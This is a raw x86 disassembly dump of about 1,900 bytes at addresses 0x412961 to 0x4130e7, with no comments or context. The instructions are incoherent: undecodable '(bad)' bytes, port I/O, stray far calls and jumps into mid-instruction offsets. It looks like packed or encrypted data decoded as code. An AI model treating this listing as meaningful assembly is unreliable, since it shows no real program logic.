  412961:	add    DWORD PTR gs:[ebp-0x1726252c],eax
  412968:	dec    BYTE PTR [esi]
  41296a:	lahf   
  41296b:	test   DWORD PTR [eax+0x3e8f1184],edx
  412971:	jns    0x412995
  412973:	sub    al,0x53
  412975:	dec    edx
  412976:	retf   0xe0cc
  412979:	enter  0xf125,0x31
  41297d:	sub    ebp,ebx
  41297f:	mov    al,ds:0xf3aa1000
  412984:	adc    al,0xd3
  412986:	sbb    ebp,DWORD PTR [edx-0x7bdb78ba]
  41298c:	xor    bh,BYTE PTR ds:0xb33e0e4b
  412992:	mov    edi,0x81289543
  412997:	mov    BYTE PTR [edi],dl
  412999:	out    0x2a,eax
  41299b:	int3   
  41299c:	dec    esp
  41299d:	shl    DWORD PTR [edx],0x8e
  4129a0:	rol    eax,0x75
  4129a3:	mov    edi,0x925af89b
  4129a8:	dec    ebx
  4129a9:	fidivr DWORD PTR [edx+0x705c64f9]
  4129af:	cld    
  4129b0:	adc    BYTE PTR [edx],bl
  4129b2:	pop    edx
  4129b3:	xor    al,BYTE PTR [ebx+0x5ca0a2b4]
  4129b9:	push   cs
  4129ba:	pop    esp
  4129bb:	push   cs
  4129bc:	icebp  
  4129bd:	aaa    
  4129be:	iret   
  4129bf:	mov    bl,BYTE PTR [eax]
  4129c1:	pop    es
  4129c2:	popf   
  4129c3:	outs   dx,DWORD PTR ds:[esi]
  4129c4:	cli    
  4129c5:	fdiv   DWORD PTR [edx-0x6819fd55]
  4129cb:	mov    edi,0xd9d82f7a
  4129d0:	aas    
  4129d1:	sti    
  4129d2:	and    bl,BYTE PTR [ebx]
  4129d4:	push   ecx
  4129d5:	xchg   esp,eax
  4129d6:	mov    dl,bl
  4129d8:	loopne 0x4129c1
  4129da:	bound  ecx,QWORD PTR [ecx]
  4129dc:	add    eax,ebp
  4129de:	aas    
  4129df:	into   
  4129e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129e1:	mov    ah,0xf
  4129e3:	jb     0x412a23
  4129e5:	aas    
  4129e6:	jnp    0x412a61
  4129e8:	cwde   
  4129e9:	pop    ss
  4129ea:	imul   edi,DWORD PTR [edi+0x2f],0xdda34ce7
  4129f1:	fcmovb st,st(0)
  4129f3:	pop    edx
  4129f4:	xchg   edi,eax
  4129f5:	adc    eax,0xefef38d
  4129fa:	pop    edx
  4129fb:	stos   BYTE PTR es:[edi],al
  4129fc:	or     eax,0x302e59f9
  412a01:	call   0xb8d3a8a6
  412a06:	mov    al,bl
  412a08:	mov    bl,BYTE PTR [esi+0x19]
  412a0b:	inc    ebp
  412a0c:	ds jnp 0x4129ba
  412a0f:	jno    0x412999
  412a11:	gs xor ecx,edx
  412a14:	repz sbb DWORD PTR [eax],ebx
  412a17:	outs   dx,BYTE PTR ds:[esi]
  412a18:	loopne 0x412a00
  412a1a:	mov    dh,0x62
  412a1c:	call   0xc77d:0x29ff3743
  412a23:	(bad)  
  412a24:	daa    
  412a25:	sbb    al,0x5b
  412a27:	push   esi
  412a28:	or     al,cl
  412a2a:	imul   ecx,DWORD PTR [eax+eiz*4+0x4185344e],0x3032134a
  412a35:	sbb    edi,DWORD PTR [edx]
  412a37:	or     dh,BYTE PTR [esi+ecx*4+0x1a]
  412a3b:	arpl   bp,di
  412a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a3e:	pop    edx
  412a3f:	mov    dl,0xc6
  412a41:	imul   eax,edx,0xffffff85
  412a44:	fisttp WORD PTR [eax+0x353fab57]
  412a4a:	mov    esi,0x205c6348
  412a4f:	mov    al,0x2
  412a51:	fsqrt  
  412a53:	call   0x713010ca
  412a58:	repz jmp 0x777f3700
  412a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a5f:	aam    0x7c
  412a61:	xchg   esp,eax
  412a62:	add    al,0xe
  412a64:	adc    bh,ah
  412a66:	(bad)  
  412a67:	cli    
  412a68:	pushf  
  412a69:	fwait
  412a6a:	mov    dl,0xae
  412a6c:	fdiv   st,st(5)
  412a6e:	(bad)  
  412a6f:	pop    esp
  412a70:	pop    ebx
  412a71:	and    ebx,DWORD PTR [ebx+0x7c]
  412a74:	sub    BYTE PTR [edx+0x4512b86e],cl
  412a7a:	xor    DWORD PTR [ebp-0x64655ad3],eax
  412a80:	aas    
  412a81:	dec    ecx
  412a82:	xchg   esi,eax
  412a83:	cli    
  412a84:	xor    eax,0xa8d63d3b
  412a89:	out    0x7e,eax
  412a8b:	inc    ebp
  412a8c:	adc    BYTE PTR [ecx],bl
  412a8e:	cmp    DWORD PTR [eax+0x62],ebx
  412a91:	mov    cl,0x0
  412a93:	pop    es
  412a94:	inc    ebp
  412a95:	xchg   edi,eax
  412a96:	pop    ebx
  412a97:	or     bl,ah
  412a99:	inc    esi
  412a9a:	sub    edx,DWORD PTR [esi-0x7b137fc6]
  412aa0:	cmp    ebp,DWORD PTR [ecx+0x3f]
  412aa3:	mov    ds:0x39334d3f,eax
  412aa8:	jb     0x412af5
  412aaa:	xor    ecx,ebp
  412aac:	cld    
  412aad:	in     al,0x92
  412aaf:	lods   al,BYTE PTR ds:[esi]
  412ab0:	and    ebp,ebx
  412ab2:	inc    esi
  412ab3:	xchg   ecx,eax
  412ab4:	das    
  412ab5:	push   es
  412ab6:	jcxz   0x412adc
  412ab9:	inc    ecx
  412aba:	sbb    eax,0xef42e59d
  412abf:	and    al,0x38
  412ac1:	push   ebp
  412ac2:	mov    dl,BYTE PTR ds:0xea6823e0
  412ac8:	shr    BYTE PTR gs:[ebx+0x5bdbe477],1
  412acf:	in     al,0xda
  412ad1:	push   ebx
  412ad2:	aaa    
  412ad3:	mov    ah,0xb0
  412ad5:	and    ch,ch
  412ad7:	and    esi,0x65
  412ada:	sbb    eax,0xbb03671e
  412adf:	jmp    0x412af6
  412ae1:	fs pop edx
  412ae3:	cmp    al,0x56
  412ae5:	sbb    dl,0xc9
  412ae8:	xchg   esp,eax
  412ae9:	add    al,0x9
  412aeb:	lock push cs
  412aed:	bound  ebx,QWORD PTR [ebx-0x35]
  412af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412af1:	sbb    al,0x2d
  412af3:	push   cs
  412af4:	aas    
  412af5:	leave  
  412af6:	mov    eax,ds:0x5f035c74
  412afb:	mov    ah,0x2a
  412afd:	popf   
  412afe:	jl     0x412abd
  412b00:	xor    BYTE PTR [edx-0x592e4fe8],dl
  412b06:	or     eax,0x5286b627
  412b0b:	in     eax,dx
  412b0c:	xchg   ecx,eax
  412b0d:	sbb    eax,0x87736c5b
  412b12:	test   eax,0xea617a7b
  412b17:	frstor [edx]
  412b19:	jo     0x412b78
  412b1b:	repz stc 
  412b1d:	inc    eax
  412b1e:	ds inc esi
  412b20:	pop    esi
  412b22:	mov    esi,0x72b13f26
  412b27:	xchg   DWORD PTR [ebx+ecx*1-0x18a19aac],esp
  412b2e:	cs (bad) 
  412b30:	les    eax,FWORD PTR [ecx]
  412b32:	mov    esp,0x5e79372d
  412b37:	jbe    0x412b92
  412b39:	out    0x2b,al
  412b3b:	mov    esi,0x29080a90
  412b40:	jo     0x412ac8
  412b42:	sbb    al,0x27
  412b44:	jae    0x412b75
  412b46:	aas    
  412b47:	jnp    0x412b79
  412b49:	jne    0x412afc
  412b4b:	mov    BYTE PTR [esi],0xc8
  412b4e:	mov    edi,0x675a3f30
  412b53:	add    eax,0xdadae8a7
  412b58:	cmp    al,0xee
  412b5a:	lods   al,BYTE PTR ds:[esi]
  412b5b:	xchg   edi,eax
  412b5c:	adc    si,sp
  412b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b60:	cmc    
  412b61:	xor    BYTE PTR [ebp+0x5aac9275],ah
  412b67:	dec    eax
  412b68:	fisttp DWORD PTR [ebx]
  412b6a:	imul   eax,ecx,0xc
  412b6d:	out    0x90,al
  412b6f:	bound  esi,QWORD PTR [ebx]
  412b71:	mov    eax,0x9c216a4
  412b76:	lods   al,BYTE PTR ds:[esi]
  412b77:	fist   WORD PTR [esi]
  412b79:	or     al,0x5a
  412b7b:	out    dx,al
  412b7c:	or     DWORD PTR [ecx],edx
  412b7e:	fs ret 0x16f8
  412b82:	clc    
  412b83:	imul   ebp,DWORD PTR [esi+ecx*4-0x71c10b6b],0xf21adc24
  412b8e:	stos   BYTE PTR es:[edi],al
  412b8f:	mov    esi,DWORD PTR [eax]
  412b91:	dec    ecx
  412b92:	add    DWORD PTR [eax-0xee27967],edi
  412b98:	sub    al,0x79
  412b9a:	fidivr DWORD PTR [ebx+0x2a]
  412b9d:	pusha  
  412b9e:	pop    eax
  412b9f:	test   BYTE PTR [eax+esi*8+0x65],cl
  412ba3:	cmp    edi,edi
  412ba5:	test   al,0x6e
  412ba7:	aam    0x3d
  412ba9:	cmp    DWORD PTR [ebx+0x4b],0xffffffa8
  412bad:	adc    BYTE PTR [edx],dl
  412baf:	loope  0x412b38
  412bb1:	mov    edx,0xe745ac1e
  412bb6:	mov    dh,0x4c
  412bb8:	pop    es
  412bb9:	cs in  al,dx
  412bbb:	add    BYTE PTR [ecx-0x50],0xa5
  412bbf:	or     al,0x45
  412bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc2:	pop    edx
  412bc3:	ret    0xdbd1
  412bc6:	pop    ecx
  412bc7:	pop    ecx
  412bc8:	inc    eax
  412bc9:	sbb    eax,0x5ab0f420
  412bce:	pop    edx
  412bcf:	ins    DWORD PTR es:[edi],dx
  412bd0:	pop    ebp
  412bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bd2:	enter  0x527d,0x6c
  412bd6:	pop    edx
  412bd7:	sbb    al,0xd5
  412bd9:	sub    DWORD PTR [ecx],ecx
  412bdb:	xor    edx,edx
  412bdd:	xchg   BYTE PTR ds:0xe8544987,bl
  412be3:	dec    edi
  412be4:	mov    esi,0xfd5ae6b6
  412be9:	or     dl,BYTE PTR [ebx]
  412beb:	fsubr  QWORD PTR [eax+0x2482fe09]
  412bf1:	push   edx
  412bf2:	jle    0x412bf8
  412bf4:	jmp    0xe3fac6be
  412bf9:	jae    0x412c56
  412bfb:	jl     0x412bc0
  412bfd:	lahf   
  412bfe:	pusha  
  412bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c00:	push   0x3e87558e
  412c05:	push   ds
  412c06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c07:	xor    ecx,ebp
  412c09:	pop    ss
  412c0a:	xchg   ebx,eax
  412c0b:	ja     0x412c4b
  412c0d:	pop    ebp
  412c0e:	cmp    ah,BYTE PTR [ebp-0x4426a9a4]
  412c14:	mov    ebx,0xc542bce6
  412c19:	push   ecx
  412c1a:	out    dx,al
  412c1b:	mov    eax,ds:0xc839bfcb
  412c20:	enter  0x5ad1,0x58
  412c24:	xchg   esp,eax
  412c25:	loopne 0x412bb3
  412c27:	out    dx,eax
  412c28:	adc    BYTE PTR [ebx],dh
  412c2a:	mov    esi,0xf9e0ab84
  412c2f:	jno    0x412c6f
  412c31:	fld    DWORD PTR [edi+edx*8]
  412c34:	jae    0x412c62
  412c36:	test   cl,dl
  412c38:	arpl   ax,bx
  412c3a:	adc    al,0xae
  412c3c:	outs   dx,DWORD PTR ds:[esi]
  412c3d:	xchg   ecx,eax
  412c3e:	daa    
  412c3f:	cmp    dh,bh
  412c41:	fcomp  QWORD PTR [edx+0x4e]
  412c44:	pop    es
  412c45:	mov    DWORD PTR es:[edx+0x4a],0xe5ae2fe6
  412c4d:	out    dx,al
  412c4e:	stos   DWORD PTR es:[edi],eax
  412c4f:	mov    edi,0x91c4e0aa
  412c54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c55:	(bad)  
  412c56:	stos   DWORD PTR es:[edi],eax
  412c57:	mov    eax,0x621b969e
  412c5c:	loop   0x412cc6
  412c5e:	mov    DWORD PTR [edx],eax
  412c60:	int3   
  412c61:	in     al,0x5a
  412c63:	scas   al,BYTE PTR es:[edi]
  412c64:	js     0x412c11
  412c66:	vmovups ymm3,ymm7
  412c6a:	inc    esi
  412c6b:	cmc    
  412c6c:	pop    edi
  412c6d:	push   ss
  412c6e:	jmp    0x412ce0
  412c70:	pop    ds
  412c71:	mov    ecx,0xeb4d431a
  412c76:	daa    
  412c77:	lods   eax,DWORD PTR ds:[esi]
  412c78:	xor    eax,0xbe85dc8b
  412c7d:	in     al,dx
  412c7e:	rol    DWORD PTR [edx],1
  412c80:	sub    bh,BYTE PTR [esi+0x221c85f4]
  412c86:	mov    bl,0xbc
  412c88:	cmp    ch,cl
  412c8a:	or     al,0x17
  412c8c:	sbb    DWORD PTR ds:0xc7f997aa,ebx
  412c92:	xchg   ecx,eax
  412c93:	inc    ebp
  412c94:	mov    eax,0x3bf005b6
  412c99:	mov    eax,ds:0x8ebf1b5b
  412c9e:	clc    
  412c9f:	dec    ebx
  412ca0:	ret    0x5a92
  412ca3:	fsubr  st,st(3)
  412ca5:	aam    0x33
  412ca7:	stos   DWORD PTR es:[edi],eax
  412ca8:	cli    
  412ca9:	outs   dx,DWORD PTR ds:[esi]
  412caa:	mov    ebp,0x8b4aaa85
  412caf:	and    edx,edi
  412cb1:	aas    
  412cb2:	shl    DWORD PTR [eax],1
  412cb4:	pop    eax
  412cb5:	out    0x25,al
  412cb7:	inc    esi
  412cb8:	and    eax,ebx
  412cba:	retf   
  412cbb:	pop    esi
  412cbc:	outs   dx,DWORD PTR ds:[esi]
  412cbd:	fxch   st(0)
  412cbf:	sti    
  412cc0:	ja     0x412d32
  412cc2:	sbb    BYTE PTR [ebx+0x3f],ah
  412cc5:	rcl    bl,1
  412cc7:	mov    ebx,0xd7555e27
  412ccc:	sub    eax,0x4c865b77
  412cd1:	sub    DWORD PTR [edx+0x703fe489],edi
  412cd7:	fwait
  412cd8:	jle    0x412d4f
  412cda:	mov    esi,0x7fa731ba
  412cdf:	loopne 0x412cc7
  412ce1:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  412ce3:	or     al,BYTE PTR [esi-0x1]
  412ce6:	inc    esi
  412ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ce8:	pop    esi
  412ce9:	ds cld 
  412ceb:	dec    edx
  412cec:	(bad)  
  412ced:	ins    DWORD PTR es:[edi],dx
  412cee:	mov    ecx,0xbae6ea7b
  412cf3:	add    DWORD PTR [esi-0x7892528],ebp
  412cf9:	push   eax
  412cfa:	test   al,0xa3
  412cfc:	inc    eax
  412cfd:	rcr    DWORD PTR [ebx+0x34],0x6f
  412d01:	ret    
  412d02:	mov    al,0x96
  412d04:	push   cs
  412d05:	pop    ebp
  412d06:	mov    WORD PTR [ebp+0x7c1959cc],es
  412d0c:	dec    edi
  412d0d:	inc    ebp
  412d0e:	inc    eax
  412d0f:	cld    
  412d10:	or     DWORD PTR [edx+ecx*8-0x7b],esi
  412d14:	dec    esp
  412d15:	repnz mov dl,0x2
  412d18:	je     0x412ceb
  412d1a:	and    al,0x80
  412d1c:	push   0x64
  412d1e:	imul   ebp,DWORD PTR [esi+0x59fd73f],0x21923a13
  412d28:	push   ebx
  412d29:	(bad)  
  412d2a:	pop    edx
  412d2b:	mov    dl,0xcf
  412d2d:	mov    al,0x62
  412d2f:	jb     0x412d01
  412d31:	inc    ecx
  412d32:	mov    ecx,0xf9e3eacc
  412d37:	mov    esp,0x6fc71ef8
  412d3c:	dec    esp
  412d3d:	cmc    
  412d3e:	fwait
  412d3f:	or     esi,edi
  412d41:	inc    esi
  412d42:	pop    edx
  412d43:	sbb    dh,ah
  412d45:	mov    ebx,0x322e1c7e
  412d4a:	mov    WORD PTR [ebp-0x65ef6ded],es
  412d50:	ds sub ebp,ecx
  412d53:	(bad)  [ecx-0x48c58f1e]
  412d59:	xchg   ecx,eax
  412d5a:	in     al,dx
  412d5b:	jb     0x412d9c
  412d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d5e:	add    al,0x81
  412d60:	mov    ebp,0x20f5ba2f
  412d65:	aas    
  412d66:	inc    esi
  412d67:	xor    BYTE PTR [ebx+0x6ca017a6],ch
  412d6d:	loopne 0x412d57
  412d6f:	pop    ecx
  412d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d71:	sub    eax,DWORD PTR fs:[esi+esi*8-0x3478325c]
  412d79:	mov    ah,BYTE PTR gs:[eax-0x57]
  412d7d:	popf   
  412d7e:	mov    ah,BYTE PTR [ecx-0x4cc519a3]
  412d84:	aam    0x70
  412d86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d87:	mov    ah,BYTE PTR gs:[esi]
  412d8a:	dec    esp
  412d8b:	repz mov esi,0xacf65bc9
  412d91:	xchg   ecx,eax
  412d92:	inc    ebp
  412d93:	je     0x412df3
  412d95:	bound  eax,QWORD PTR [ebx-0x15cc797c]
  412d9b:	adc    BYTE PTR [edi],bh
  412d9d:	gs shl ecx,0xda
  412da1:	into   
  412da2:	in     al,dx
  412da3:	mov    ebp,0x8310de6b
  412da8:	(bad)  
  412da9:	out    0x23,eax
  412dab:	cmp    BYTE PTR [edx+0x3cd69806],0x13
  412db2:	inc    eax
  412db3:	xchg   edi,eax
  412db4:	ins    BYTE PTR es:[edi],dx
  412db5:	mov    al,0x85
  412db7:	(bad)  
  412db9:	xchg   BYTE PTR [edi+0xce7bc48],ah
  412dbf:	jle    0x412d62
  412dc1:	inc    ebx
  412dc2:	fwait
  412dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dc4:	popa   
  412dc5:	mov    ah,0xb5
  412dc7:	out    0xf6,al
  412dc9:	push   ecx
  412dca:	push   ebp
  412dcb:	in     al,0xdf
  412dcd:	pop    ss
  412dce:	pop    ss
  412dcf:	and    ah,BYTE PTR [ecx]
  412dd1:	add    DWORD PTR ss:[eax],ebp
  412dd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dd5:	popa   
  412dd6:	daa    
  412dd7:	test   DWORD PTR [edx+0x3f00975f],edx
  412ddd:	and    eax,edx
  412ddf:	iret   
  412de0:	call   0xfacb:0x49a88c7b
  412de7:	scas   eax,DWORD PTR es:[edi]
  412de8:	push   ds
  412de9:	out    0x94,al
  412deb:	sbb    eax,0x13553c8a
  412df0:	cmp    eax,0xedc28743
  412df5:	sahf   
  412df6:	fs loop 0x412dbf
  412df9:	loopne 0x412e1a
  412dfb:	mov    dl,0x4c
  412dfd:	mov    ds:0xee5785df,al
  412e02:	jb     0x412e26
  412e04:	shl    BYTE PTR [ebp-0x504fe337],0x5b
  412e0b:	call   0x5701c75f
  412e10:	in     al,0xe7
  412e12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e13:	test   BYTE PTR [ecx],bl
  412e15:	jbe    0x412e4e
  412e17:	sar    DWORD PTR [esi],0x55
  412e1a:	push   0x6
  412e1c:	std    
  412e1d:	adc    eax,0xe6e8df33
  412e22:	ss cmp al,0x1b
  412e25:	jge    0x412dc6
  412e27:	jge    0x412dfd
  412e29:	fild   QWORD PTR [esi-0x36]
  412e2c:	dec    edi
  412e2d:	push   esi
  412e2e:	pop    edx
  412e2f:	in     al,0x95
  412e31:	mov    edi,0x23cca254
  412e36:	cwde   
  412e37:	enter  0xd2d6,0x93
  412e3b:	test   BYTE PTR [esi],ch
  412e3d:	imul   DWORD PTR [ebx]
  412e3f:	sbb    BYTE PTR [eax+edi*4+0x5a],bl
  412e43:	ret    0x3bb
  412e46:	and    al,0x8e
  412e48:	int3   
  412e49:	inc    eax
  412e4a:	sbb    BYTE PTR [ecx+0x839eb3f],bl
  412e50:	jp     0x412e9d
  412e52:	push   ebp
  412e53:	inc    ebp
  412e54:	loope  0x412e75
  412e56:	pop    edx
  412e57:	dec    edx
  412e58:	fldenv [eax+0x767c2afe]
  412e5e:	pop    DWORD PTR [ebp-0x215f981c]
  412e64:	aad    0xe9
  412e66:	(bad)  
  412e68:	imul   eax,DWORD PTR [edi],0x93a9665b
  412e6e:	and    bh,BYTE PTR [ebx+0x38]
  412e71:	sub    BYTE PTR [edi],dh
  412e73:	test   BYTE PTR [edi+0x66],ch
  412e76:	sub    esi,DWORD PTR [ecx]
  412e78:	ds xor eax,0x9f48ff6c
  412e7e:	ds sahf 
  412e80:	or     al,0xe7
  412e82:	push   es
  412e83:	and    ah,bl
  412e85:	fcmove st,st(4)
  412e87:	inc    edi
  412e88:	outs   dx,DWORD PTR ds:[esi]
  412e89:	cmc    
  412e8a:	push   ecx
  412e8b:	js     0x412ea1
  412e8d:	arpl   WORD PTR [edx-0x66],bx
  412e90:	xchg   ecx,eax
  412e91:	adc    DWORD PTR [ebp-0x16d3ef67],0x96f70a84
  412e9b:	mov    DWORD PTR [esi],edi
  412e9d:	stc    
  412e9e:	sbb    ebp,DWORD PTR [esi]
  412ea0:	mul    DWORD PTR [ebx]
  412ea2:	mov    edx,0x8bac608
  412ea7:	and    BYTE PTR [edx-0x1a],bl
  412eaa:	sbb    BYTE PTR [edx],0xcc
  412ead:	push   0x673f1575
  412eb2:	inc    esi
  412eb3:	push   cs
  412eb4:	xor    eax,edi
  412eb6:	sub    ecx,DWORD PTR [edi+eiz*1-0x28]
  412eba:	jbe    0x412ed2
  412ebc:	ret    0xc1e6
  412ebf:	es inc ebx
  412ec1:	enter  0xde12,0x3f
  412ec5:	in     eax,0xa5
  412ec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ec8:	inc    edx
  412ec9:	xchg   edi,eax
  412eca:	jb     0x412e5e
  412ecc:	cmp    cl,BYTE PTR ds:0x156cfeee
  412ed2:	lahf   
  412ed3:	cwde   
  412ed4:	std    
  412ed5:	ins    BYTE PTR es:[edi],dx
  412ed6:	mov    al,0x7
  412ed8:	push   ecx
  412ed9:	pop    esi
  412eda:	lea    esi,[edx+edi*1-0x53]
  412ede:	push   es
  412edf:	pop    es
  412ee0:	add    dh,bh
  412ee2:	sbb    ah,cl
  412ee4:	call   0xc045cc2e
  412ee9:	push   eax
  412eea:	pop    ebx
  412eeb:	test   DWORD PTR [eax+0x3e20a170],edi
  412ef1:	push   edi
  412ef2:	inc    ecx
  412ef3:	cmc    
  412ef4:	scas   al,BYTE PTR es:[edi]
  412ef5:	push   edx
  412ef6:	ins    DWORD PTR es:[edi],dx
  412ef7:	adc    esi,DWORD PTR [ebp-0x73]
  412efa:	jnp    0x412f61
  412efc:	out    dx,eax
  412efd:	mov    ebp,0xbe37d0da
  412f02:	pop    ebx
  412f03:	bound  esp,QWORD PTR [esi]
  412f05:	mov    ecx,0x75f66351
  412f0a:	stos   DWORD PTR es:[edi],eax
  412f0b:	test   BYTE PTR [eax],dh
  412f0d:	daa    
  412f0e:	jns    0x412f71
  412f10:	xor    DWORD PTR [edi-0x53],eax
  412f13:	pusha  
  412f14:	jne    0x412e9d
  412f16:	xchg   DWORD PTR ds:0xe11aa1b3,ebp
  412f1c:	shr    BYTE PTR [esi+0x65d9849e],1
  412f22:	(bad)  
  412f23:	jle    0x412f64
  412f25:	jg     0x412ecd
  412f27:	hlt    
  412f28:	cld    
  412f29:	imul   esp,ebp,0x1f
  412f2c:	retf   0x456
  412f2f:	sbb    bh,BYTE PTR [edi]
  412f31:	jmp    DWORD PTR [esp+ecx*8-0x49]
  412f35:	xor    eax,0x5bc92c53
  412f3a:	(bad)  
  412f3b:	cdq    
  412f3c:	loopne 0x412f25
  412f3e:	jo     0x412f75
  412f40:	outs   dx,DWORD PTR ds:[esi]
  412f41:	inc    edx
  412f42:	xor    eax,DWORD PTR [edi-0x18]
  412f45:	call   0x64c7b1cf
  412f4a:	pop    ecx
  412f4b:	out    0xd,ax
  412f4e:	into   
  412f4f:	(bad)  
  412f50:	loopne 0x412f4c
  412f52:	sar    BYTE PTR [ebx-0x6a],cl
  412f55:	xor    ah,dl
  412f57:	daa    
  412f58:	and    al,0x83
  412f5a:	sbb    cl,BYTE PTR [esi+0xf87f733]
  412f60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f61:	sub    cl,BYTE PTR [esi-0x4d]
  412f64:	stos   BYTE PTR es:[edi],al
  412f65:	out    0x62,al
  412f67:	fs push ecx
  412f69:	pop    ebx
  412f6a:	(bad)  
  412f6b:	stc    
  412f6c:	inc    eax
  412f6d:	je     0x412eff
  412f6f:	push   ebp
  412f70:	lds    esp,FWORD PTR [ecx+0x7cb52aa7]
  412f76:	pop    ebx
  412f77:	sahf   
  412f78:	aaa    
  412f79:	cmp    eax,DWORD PTR [edi-0x80]
  412f7c:	and    bl,BYTE PTR [esi]
  412f7e:	fdivr  QWORD PTR [edi+0x4d1836d]
  412f84:	dec    ecx
  412f85:	les    ebx,FWORD PTR [ecx+0x16]
  412f88:	xchg   edi,eax
  412f89:	mov    bh,0x5c
  412f8b:	scas   al,BYTE PTR es:[edi]
  412f8c:	and    al,BYTE PTR [edi-0x196a5a67]
  412f92:	dec    esi
  412f93:	mov    edx,0x2413335
  412f98:	pop    es
  412f99:	pop    es
  412f9a:	jne    0x412ffd
  412f9c:	mov    cl,0xd4
  412f9e:	pop    ebx
  412f9f:	inc    eax
  412fa0:	dec    ebx
  412fa1:	adc    ch,BYTE PTR [edi+0x33]
  412fa4:	ins    BYTE PTR es:[edi],dx
  412fa5:	test   BYTE PTR [eax*4-0x4f816864],cl
  412fac:	ds popf 
  412fae:	sub    edx,ecx
  412fb0:	out    0x37,al
  412fb2:	xor    al,0x64
  412fb4:	pop    eax
  412fb5:	fsub   QWORD PTR [ebp+ebp*1-0x52]
  412fb9:	out    0xa,al
  412fbb:	mov    esp,DWORD PTR [edi]
  412fbd:	cmc    
  412fbe:	imul   esp,DWORD PTR [eax+0x18],0x3aa06b01
  412fc5:	jae    0x412fa9
  412fc7:	sar    DWORD PTR [edi+eiz*2-0x5e],cl
  412fcb:	inc    edi
  412fcc:	cli    
  412fcd:	call   FWORD PTR [eax+0x6d12f7f3]
  412fd3:	imul   edi,DWORD PTR [edi],0x7a1c975d
  412fd9:	mov    al,ds:0x2650be24
  412fde:	and    eax,0x48ee6cc5
  412fe3:	push   0xb5710e72
  412fe8:	inc    edi
  412fe9:	cld    
  412fea:	add    DWORD PTR [ebp-0x5213c8c3],0x93437b1f
  412ff4:	mov    esi,0xd266514d
  412ff9:	cs fst st(5)
  412ffc:	repnz inc ebx
  412ffe:	pop    ebp
  412fff:	sbb    al,0x34
  413001:	sub    BYTE PTR [ebx-0x40],bl
  413004:	sbb    eax,0x961222b9
  413009:	gs push es
  41300b:	sub    dl,BYTE PTR [ebx+0x4c]
  41300e:	pop    ebx
  41300f:	les    esi,FWORD PTR [ecx]
  413011:	add    al,0x7a
  413013:	pop    ss
  413014:	sub    al,0xe9
  413016:	xor    BYTE PTR [ebx+edi*2-0x1c58157],al
  41301d:	dec    ecx
  41301e:	pop    ss
  41301f:	mov    bl,0x86
  413021:	or     ebx,ebx
  413023:	or     BYTE PTR [edx],bh
  413025:	ins    BYTE PTR es:[edi],dx
  413026:	leave  
  413027:	test   BYTE PTR [edx+0x3e56139b],ch
  41302d:	xchg   DWORD PTR [esi-0x36],ecx
  413030:	pop    ebx
  413031:	adc    eax,DWORD PTR [esi-0x63]
  413034:	(bad)
  413038:	test   DWORD PTR [ecx+esi*1+0xa4e90c],0x2a8bbaaf
  413043:	xchg   DWORD PTR [edi+0x1e6e5acc],edx
  413049:	call   0x2c39bc60
  41304e:	add    BYTE PTR [ebp-0x6c326da5],0x3e
  413055:	push   ecx
  413056:	sbb    BYTE PTR [edx],cl
  413058:	jle    0x413012
  41305a:	(bad)  
  41305b:	pop    esi
  41305c:	outs   dx,DWORD PTR ds:[esi]
  41305d:	in     eax,0x2a
  41305f:	(bad)  [eax-0x22]
  413062:	fs sub al,0xc
  413065:	cdq    
  413066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413067:	imul   edi,DWORD PTR [edi+0x982607c],0x72
  41306e:	or     BYTE PTR [ecx+0x74c4e783],bh
  413074:	jp     0x412ffa
  413076:	sub    eax,0x7b122a88
  41307b:	fadd   QWORD PTR ds:0x21965bbc
  413081:	jp     0x413065
  413083:	push   esp
  413084:	test   esi,esp
  413086:	dec    esp
  413087:	push   ebp
  413088:	lods   eax,DWORD PTR ds:[esi]
  413089:	dec    ecx
  41308b:	jns    0x413045
  41308d:	fidiv  WORD PTR [ecx-0x5d]
  413090:	fldcw  WORD PTR [ebx-0x7338d3a5]
  413096:	shld   DWORD PTR [edx],ebp,cl
  413099:	jle    0x413095
  41309b:	test   BYTE PTR [ecx],cl
  41309d:	adc    bl,dh
  41309f:	aas    
  4130a0:	sub    eax,0xb8f0944b
  4130a5:	jmp    0x279f627a
  4130aa:	dec    esp
  4130ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130ac:	leave  
  4130ad:	out    0xf2,al
  4130af:	add    edx,DWORD PTR [edi+ecx*2+0x62]
  4130b3:	scas   eax,DWORD PTR es:[edi]
  4130b4:	ds push cs
  4130b6:	mov    ?,WORD PTR [ebp+0x5f83eb3e]
  4130bc:	adc    BYTE PTR [edi+ebx*8+0x2e73196],dh
  4130c3:	push   ds
  4130c4:	push   0x47
  4130c6:	inc    ebp
  4130c7:	jb     0x4130ec
  4130c9:	sub    ebp,DWORD PTR [edi]
  4130cb:	(bad)  
  4130cc:	cmc    
  4130cd:	loopne 0x41312b
  4130cf:	call   0x19e1:0x56f566e9
  4130d6:	sub    al,0xa4
  4130d8:	add    BYTE PTR [ebp-0x44],dl
  4130db:	call   0x3774:0xbe50cb7d
  4130e2:	fwait
  4130e3:	(bad)  
  4130e4:	ds scas eax,DWORD PTR es:[edi]
  4130e6:	icebp  
  4130e7:	inc    ebx
